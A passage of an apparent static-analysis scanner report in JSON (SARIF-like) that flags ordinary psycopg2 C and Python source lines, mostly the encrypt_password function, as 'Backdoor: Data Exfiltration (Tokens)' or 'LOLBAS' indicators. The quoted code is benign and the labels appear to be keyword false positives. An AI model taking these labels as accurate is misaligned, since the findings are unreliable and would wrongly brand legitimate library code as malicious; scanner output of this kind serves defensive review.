            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 435,
                  "startColumn": 17,
                  "endLine": 435,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#if PG_VERSION_NUM >= 100000\n        if (!conn) {\n            PyErr_SetString(ProgrammingError,\n                \"password encryption (other than 'md5' algorithm)\"\n                \" requires a connection or cursor\");\n            goto exit;\n        }\n",
                    "rendered": {
                      "text": "#if PG_VERSION_NUM >= 100000\n        if (!conn) {\n            PyErr_SetString(ProgrammingError,\n                \"password encryption (other than 'md5' algorithm)\"\n                \" requires a connection or cursor\");\n            goto exit;\n        }\n",
                      "markdown": "`#if PG_VERSION_NUM >= 100000\n        if (!conn) {\n            PyErr_SetString(ProgrammingError,\n                \"password encryption (other than 'md5' algorithm)\"\n                \" requires a connection or cursor\");\n            goto exit;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 426,
                  "startColumn": 28,
                  "endLine": 426,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    if (algorithm != Py_None &&\n            strcmp(Bytes_AS_STRING(algorithm), \"md5\") == 0) {\n        encrypted = PQencryptPassword(\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user));\n    }\n\n    /* If the algorithm is not md5 we have to use the API available from\n",
                    "rendered": {
                      "text": "    if (algorithm != Py_None &&\n            strcmp(Bytes_AS_STRING(algorithm), \"md5\") == 0) {\n        encrypted = PQencryptPassword(\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user));\n    }\n\n    /* If the algorithm is not md5 we have to use the API available from\n",
                      "markdown": "`    if (algorithm != Py_None &&\n            strcmp(Bytes_AS_STRING(algorithm), \"md5\") == 0) {\n        encrypted = PQencryptPassword(\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user));\n    }\n\n    /* If the algorithm is not md5 we have to use the API available from\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 425,
                  "startColumn": 29,
                  "endLine": 425,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    /* If we have to encrypt md5 we can use the libpq < 10 API */\n    if (algorithm != Py_None &&\n            strcmp(Bytes_AS_STRING(algorithm), \"md5\") == 0) {\n        encrypted = PQencryptPassword(\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user));\n    }\n\n",
                    "rendered": {
                      "text": "    /* If we have to encrypt md5 we can use the libpq < 10 API */\n    if (algorithm != Py_None &&\n            strcmp(Bytes_AS_STRING(algorithm), \"md5\") == 0) {\n        encrypted = PQencryptPassword(\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user));\n    }\n\n",
                      "markdown": "`    /* If we have to encrypt md5 we can use the libpq < 10 API */\n    if (algorithm != Py_None &&\n            strcmp(Bytes_AS_STRING(algorithm), \"md5\") == 0) {\n        encrypted = PQencryptPassword(\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user));\n    }\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 415,
                  "startColumn": 40,
                  "endLine": 415,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    }\n\n    if (!(user = psyco_ensure_bytes(user))) { goto exit; }\n    if (!(password = psyco_ensure_bytes(password))) { goto exit; }\n    if (algorithm != Py_None) {\n        if (!(algorithm = psyco_ensure_bytes(algorithm))) {\n            goto exit;\n",
                    "rendered": {
                      "text": "    }\n\n    if (!(user = psyco_ensure_bytes(user))) { goto exit; }\n    if (!(password = psyco_ensure_bytes(password))) { goto exit; }\n    if (algorithm != Py_None) {\n        if (!(algorithm = psyco_ensure_bytes(algorithm))) {\n            goto exit;\n",
                      "markdown": "`    }\n\n    if (!(user = psyco_ensure_bytes(user))) { goto exit; }\n    if (!(password = psyco_ensure_bytes(password))) { goto exit; }\n    if (algorithm != Py_None) {\n        if (!(algorithm = psyco_ensure_bytes(algorithm))) {\n            goto exit;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 415,
                  "startColumn": 10,
                  "endLine": 415,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    }\n\n    if (!(user = psyco_ensure_bytes(user))) { goto exit; }\n    if (!(password = psyco_ensure_bytes(password))) { goto exit; }\n    if (algorithm != Py_None) {\n        if (!(algorithm = psyco_ensure_bytes(algorithm))) {\n            goto exit;\n",
                    "rendered": {
                      "text": "    }\n\n    if (!(user = psyco_ensure_bytes(user))) { goto exit; }\n    if (!(password = psyco_ensure_bytes(password))) { goto exit; }\n    if (algorithm != Py_None) {\n        if (!(algorithm = psyco_ensure_bytes(algorithm))) {\n            goto exit;\n",
                      "markdown": "`    }\n\n    if (!(user = psyco_ensure_bytes(user))) { goto exit; }\n    if (!(password = psyco_ensure_bytes(password))) { goto exit; }\n    if (algorithm != Py_None) {\n        if (!(algorithm = psyco_ensure_bytes(algorithm))) {\n            goto exit;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 397,
                  "startColumn": 14,
                  "endLine": 397,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n    /* for ensure_bytes */\n    Py_INCREF(user);\n    Py_INCREF(password);\n    Py_INCREF(algorithm);\n\n    if (scope != Py_None) {\n",
                    "rendered": {
                      "text": "\n    /* for ensure_bytes */\n    Py_INCREF(user);\n    Py_INCREF(password);\n    Py_INCREF(algorithm);\n\n    if (scope != Py_None) {\n",
                      "markdown": "`\n    /* for ensure_bytes */\n    Py_INCREF(user);\n    Py_INCREF(password);\n    Py_INCREF(algorithm);\n\n    if (scope != Py_None) {\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 391,
                  "startColumn": 13,
                  "endLine": 391,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    static char *kwlist[] = {\"password\", \"user\", \"scope\", \"algorithm\", NULL};\n\n    if (!PyArg_ParseTupleAndKeywords(args, kwargs, \"OO|OO\", kwlist,\n            &password, &user, &scope, &algorithm)) {\n        return NULL;\n    }\n\n",
                    "rendered": {
                      "text": "    static char *kwlist[] = {\"password\", \"user\", \"scope\", \"algorithm\", NULL};\n\n    if (!PyArg_ParseTupleAndKeywords(args, kwargs, \"OO|OO\", kwlist,\n            &password, &user, &scope, &algorithm)) {\n        return NULL;\n    }\n\n",
                      "markdown": "`    static char *kwlist[] = {\"password\", \"user\", \"scope\", \"algorithm\", NULL};\n\n    if (!PyArg_ParseTupleAndKeywords(args, kwargs, \"OO|OO\", kwlist,\n            &password, &user, &scope, &algorithm)) {\n        return NULL;\n    }\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 388,
                  "startColumn": 30,
                  "endLine": 388,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    PyObject *res = NULL;\n    connectionObject *conn = NULL;\n\n    static char *kwlist[] = {\"password\", \"user\", \"scope\", \"algorithm\", NULL};\n\n    if (!PyArg_ParseTupleAndKeywords(args, kwargs, \"OO|OO\", kwlist,\n            &password, &user, &scope, &algorithm)) {\n",
                    "rendered": {
                      "text": "    PyObject *res = NULL;\n    connectionObject *conn = NULL;\n\n    static char *kwlist[] = {\"password\", \"user\", \"scope\", \"algorithm\", NULL};\n\n    if (!PyArg_ParseTupleAndKeywords(args, kwargs, \"OO|OO\", kwlist,\n            &password, &user, &scope, &algorithm)) {\n",
                      "markdown": "`    PyObject *res = NULL;\n    connectionObject *conn = NULL;\n\n    static char *kwlist[] = {\"password\", \"user\", \"scope\", \"algorithm\", NULL};\n\n    if (!PyArg_ParseTupleAndKeywords(args, kwargs, \"OO|OO\", kwlist,\n            &password, &user, &scope, &algorithm)) {\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 383,
                  "startColumn": 14,
                  "endLine": 383,
                  "endColumn": 22,
                  "snippet": {
                    "text": "encrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n{\n    char *encrypted = NULL;\n    PyObject *password = NULL, *user = NULL;\n    PyObject *scope = Py_None, *algorithm = Py_None;\n    PyObject *res = NULL;\n    connectionObject *conn = NULL;\n",
                    "rendered": {
                      "text": "encrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n{\n    char *encrypted = NULL;\n    PyObject *password = NULL, *user = NULL;\n    PyObject *scope = Py_None, *algorithm = Py_None;\n    PyObject *res = NULL;\n    connectionObject *conn = NULL;\n",
                      "markdown": "`encrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n{\n    char *encrypted = NULL;\n    PyObject *password = NULL, *user = NULL;\n    PyObject *scope = Py_None, *algorithm = Py_None;\n    PyObject *res = NULL;\n    connectionObject *conn = NULL;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 380,
                  "startColumn": 8,
                  "endLine": 380,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n{\n    char *encrypted = NULL;\n    PyObject *password = NULL, *user = NULL;\n",
                    "rendered": {
                      "text": "\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n{\n    char *encrypted = NULL;\n    PyObject *password = NULL, *user = NULL;\n",
                      "markdown": "`\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n{\n    char *encrypted = NULL;\n    PyObject *password = NULL, *user = NULL;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 377,
                  "startColumn": 103,
                  "endLine": 377,
                  "endColumn": 111,
                  "snippet": {
                    "text": "\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n",
                    "rendered": {
                      "text": "\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n",
                      "markdown": "`\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 377,
                  "startColumn": 18,
                  "endLine": 377,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n",
                    "rendered": {
                      "text": "\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n",
                      "markdown": "`\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 377,
                  "startColumn": 9,
                  "endLine": 377,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n",
                    "rendered": {
                      "text": "\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n",
                      "markdown": "`\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\nencrypt_password(PyObject *self, PyObject *args, PyObject *kwargs)\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 376,
                  "startColumn": 16,
                  "endLine": 376,
                  "endColumn": 24,
                  "snippet": {
                    "text": "}\n\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\n",
                    "rendered": {
                      "text": "}\n\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\n",
                      "markdown": "`}\n\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\nstatic PyObject *\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 375,
                  "startColumn": 44,
                  "endLine": 375,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    return PyInt_FromLong(PQlibVersion());\n}\n\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\n",
                    "rendered": {
                      "text": "    return PyInt_FromLong(PQlibVersion());\n}\n\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\n",
                      "markdown": "`    return PyInt_FromLong(PQlibVersion());\n}\n\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 375,
                  "startColumn": 11,
                  "endLine": 375,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    return PyInt_FromLong(PQlibVersion());\n}\n\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\n",
                    "rendered": {
                      "text": "    return PyInt_FromLong(PQlibVersion());\n}\n\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\n",
                      "markdown": "`    return PyInt_FromLong(PQlibVersion());\n}\n\n/* encrypt_password - Prepare the encrypted password form */\n#define encrypt_password_doc \\\n\"encrypt_password(password, user, [scope], [algorithm]) -- Prepares the encrypted form of a PostgreSQL password.\\n\\n\"\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 150,
                  "startColumn": 63,
                  "endLine": 150,
                  "endColumn": 71,
                  "snippet": {
                    "text": "        goto exit;\n    }\n\n    res = psyco_dict_from_conninfo_options(options, /* include_password = */ 1);\n\nexit:\n    PQconninfoFree(options);    /* safe on null */\n",
                    "rendered": {
                      "text": "        goto exit;\n    }\n\n    res = psyco_dict_from_conninfo_options(options, /* include_password = */ 1);\n\nexit:\n    PQconninfoFree(options);    /* safe on null */\n",
                      "markdown": "`        goto exit;\n    }\n\n    res = psyco_dict_from_conninfo_options(options, /* include_password = */ 1);\n\nexit:\n    PQconninfoFree(options);    /* safe on null */\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/replication_message_type.c"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 35,
                  "endLine": 51,
                  "endColumn": 39,
                  "snippet": {
                    "text": "replmsg_repr(replicationMessageObject *self)\n{\n    return PyString_FromFormat(\n        \"<ReplicationMessage object at %p; data_size: %d; \"\n        \"data_start: \"XLOGFMTSTR\"; wal_end: \"XLOGFMTSTR\"; send_time: %ld>\",\n        self, self->data_size, XLOGFMTARGS(self->data_start), XLOGFMTARGS(self->wal_end),\n        (long int)self->send_time);\n",
                    "rendered": {
                      "text": "replmsg_repr(replicationMessageObject *self)\n{\n    return PyString_FromFormat(\n        \"<ReplicationMessage object at %p; data_size: %d; \"\n        \"data_start: \"XLOGFMTSTR\"; wal_end: \"XLOGFMTSTR\"; send_time: %ld>\",\n        self, self->data_size, XLOGFMTARGS(self->data_start), XLOGFMTARGS(self->wal_end),\n        (long int)self->send_time);\n",
                      "markdown": "`replmsg_repr(replicationMessageObject *self)\n{\n    return PyString_FromFormat(\n        \"<ReplicationMessage object at %p; data_size: %d; \"\n        \"data_start: \"XLOGFMTSTR\"; wal_end: \"XLOGFMTSTR\"; send_time: %ld>\",\n        self, self->data_size, XLOGFMTARGS(self->data_start), XLOGFMTARGS(self->wal_end),\n        (long int)self->send_time);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/typecast_datetime.c"
                },
                "region": {
                  "startLine": 152,
                  "startColumn": 13,
                  "endLine": 152,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        n = typecast_parse_time(tp, NULL, &len, &hh, &mm, &ss, &us, &tzsec);\n        Dprintf(\"typecast_PYDATETIMETZ_cast: n = %d,\"\n            \" len = \" FORMAT_CODE_PY_SSIZE_T \",\"\n            \" hh = %d, mm = %d, ss = %d, us = %d, tzsec = %d\",\n            n, len, hh, mm, ss, us, tzsec);\n        if (n < 3 || n > 6) {\n            PyErr_SetString(DataError, \"unable to parse time\");\n",
                    "rendered": {
                      "text": "        n = typecast_parse_time(tp, NULL, &len, &hh, &mm, &ss, &us, &tzsec);\n        Dprintf(\"typecast_PYDATETIMETZ_cast: n = %d,\"\n            \" len = \" FORMAT_CODE_PY_SSIZE_T \",\"\n            \" hh = %d, mm = %d, ss = %d, us = %d, tzsec = %d\",\n            n, len, hh, mm, ss, us, tzsec);\n        if (n < 3 || n > 6) {\n            PyErr_SetString(DataError, \"unable to parse time\");\n",
                      "markdown": "`        n = typecast_parse_time(tp, NULL, &len, &hh, &mm, &ss, &us, &tzsec);\n        Dprintf(\"typecast_PYDATETIMETZ_cast: n = %d,\"\n            \" len = \" FORMAT_CODE_PY_SSIZE_T \",\"\n            \" hh = %d, mm = %d, ss = %d, us = %d, tzsec = %d\",\n            n, len, hh, mm, ss, us, tzsec);\n        if (n < 3 || n > 6) {\n            PyErr_SetString(DataError, \"unable to parse time\");\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/tools/lib/ticket_role.py"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 51,
                  "endLine": 29,
                  "endColumn": 60,
                  "snippet": {
                    "text": "            num = int(ticket.replace('#', ''))\n\n            # Push numbers of the oldel tickets ahead.\n            # We moved the tickets from a different tracker to GitHub and the\n            # latter already had a few ticket numbers taken (as merge\n            # requests).\n            remap_until = cfg.ticket_remap_until\n",
                    "rendered": {
                      "text": "            num = int(ticket.replace('#', ''))\n\n            # Push numbers of the oldel tickets ahead.\n            # We moved the tickets from a different tracker to GitHub and the\n            # latter already had a few ticket numbers taken (as merge\n            # requests).\n            remap_until = cfg.ticket_remap_until\n",
                      "markdown": "`            num = int(ticket.replace('#', ''))\n\n            # Push numbers of the oldel tickets ahead.\n            # We moved the tickets from a different tracker to GitHub and the\n            # latter already had a few ticket numbers taken (as merge\n            # requests).\n            remap_until = cfg.ticket_remap_until\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/tools/lib/ticket_role.py"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 11,
                  "endLine": 40,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n            url = cfg.ticket_url % num\n            roles.set_classes(options)\n            node = nodes.reference(ticket, utils.unescape(ticket),\n                refuri=url, **options)\n\n            rv.append(node)\n",
                    "rendered": {
                      "text": "\n            url = cfg.ticket_url % num\n            roles.set_classes(options)\n            node = nodes.reference(ticket, utils.unescape(ticket),\n                refuri=url, **options)\n\n            rv.append(node)\n",
                      "markdown": "`\n            url = cfg.ticket_url % num\n            roles.set_classes(options)\n            node = nodes.reference(ticket, utils.unescape(ticket),\n                refuri=url, **options)\n\n            rv.append(node)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
